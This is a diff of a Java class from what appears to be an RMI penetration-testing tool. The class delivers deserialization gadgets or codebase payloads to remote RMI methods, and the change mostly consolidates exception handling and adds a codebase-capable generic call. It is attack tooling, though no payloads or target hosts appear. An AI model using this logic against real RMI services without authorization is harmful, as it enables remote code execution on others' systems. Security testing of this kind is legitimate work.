@@ -42,16 +42,26 @@ public class MethodAttacker {
             remoteField.setAccessible(true);
 
         } catch(NoSuchFieldException | SecurityException e) {
-            Logger.eprintlnMixedYellow("Unexpected Exception caught during", "MethodAttacker", "instantiation.");
-            ExceptionHandler.stackTrace(e);
-            RMGUtils.exit();
+            ExceptionHandler.unexpectedException(e, "MethodAttacker", "instantiation", true);
         }
     }
 
     @SuppressWarnings({ "rawtypes", "deprecation" })
     public void attack(Object gadget, String boundName, int argumentPosition, String operationMode, int legacyMode)
     {
-        Logger.printlnMixedYellow("Attacking signature", this.targetMethod.getSignature(), "(" + operationMode + " attack)");
+        String methodName = "";
+        boolean isCodebaseCall = operationMode.equals("codebase");
+
+        try {
+            methodName = this.targetMethod.getName();
+        } catch (CannotCompileException | NotFoundException e) {
+            ExceptionHandler.unexpectedException(e, "compliation", "process", true);
+        }
+
+        if(isCodebaseCall)
+            Logger.printCodebaseAttackIntro("RMI", methodName, gadget.getClass().getName());
+        else
+            Logger.printGadgetCallIntro("RMI");
 
         if( boundName != null )
             Logger.printlnMixedBlue("Target name specified. Only attacking bound name:", boundName);
@@ -78,9 +88,7 @@ public class MethodAttacker {
             try {
                 attackArgument = this.targetMethod.getPrimitive(argumentPosition);
             } catch (CannotCompileException | NotFoundException e) {
-                Logger.eprintlnMixedYellow("Caught unexpected", e.getClass().getName(), "while searching for primitives.");
-                ExceptionHandler.stackTrace(e);
-                RMGUtils.exit();
+                ExceptionHandler.unexpectedException(e, "search", "for primitive types", true);
             }
 
             if( attackArgument == -1 ) {
@@ -107,9 +115,7 @@ public class MethodAttacker {
                     remoteClass = RMGUtils.makeLegacyStub(className, this.targetMethod);
 
             } catch(CannotCompileException e) {
-                Logger.eprintlnMixedYellow("Caught", "CannotCompileException", "during interface creation.");
-                Logger.eprintlnMixedYellow("Exception message:", e.getMessage());
-                ExceptionHandler.showStackTrace(e);
+                ExceptionHandler.cannotCompile(e, "interface", "creation", false);
                 Logger.decreaseIndent();
                 continue;
             }
@@ -126,9 +132,7 @@ public class MethodAttacker {
                 }
 
             } catch( Exception e ) {
-                Logger.eprintlnMixedYellow("Error: Unable to get instance for", name);
-                Logger.eprintlnMixedYellow("The following exception was caught:", e.getMessage());
-                ExceptionHandler.showStackTrace(e);
+                ExceptionHandler.unexpectedException(e, "lookup", "call", false);
                 Logger.decreaseIndent();
                 continue;
             }
@@ -144,24 +148,8 @@ public class MethodAttacker {
                 Class randomClass = RMGUtils.makeRandomClass();
                 randomInstance = randomClass.newInstance();
 
-            } catch (CannotCompileException e) {
-                Logger.eprintlnMixedYellow("Caught", "CannotCompileException", "during random class creation.");
-                Logger.eprintlnMixedYellow("Exception message:", e.getMessage());
-                ExceptionHandler.showStackTrace(e);
-                Logger.decreaseIndent();
-                continue;
-
-            } catch (InstantiationException | IllegalAccessException e) {
-                Logger.eprintlnMixedYellow("Caught", "InstantiationException", "during random class creation.");
-                Logger.eprintlnMixedYellow("Exception message:", e.getMessage());
-                ExceptionHandler.showStackTrace(e);
-                Logger.decreaseIndent();
-                continue;
-
-            } catch (NotFoundException e) {
-                Logger.eprintlnMixedYellow("Caught", "NotFoundException", "during random class creation.");
-                Logger.eprintlnMixedYellow("Exception message:", e.getMessage());
-                ExceptionHandler.showStackTrace(e);
+            } catch (Exception e) {
+                ExceptionHandler.unexpectedException(e, "random class", "creation", false);
                 Logger.decreaseIndent();
                 continue;
             }
@@ -174,7 +162,8 @@ public class MethodAttacker {
                 Logger.println("Invoking remote method...");
                 Logger.println("");
                 Logger.increaseIndent();
-                remoteRef.invoke(instance, attackMethod, methodArguments, this.targetMethod.getHash());
+
+                rmi.genericCall(null, -1, this.targetMethod.getHash(), methodArguments, isCodebaseCall, methodName, remoteRef);
 
                 Logger.eprintln("Remote method invocation didn't cause any exception.");
                 Logger.eprintln("This is unusual and the attack probably didn't work.");
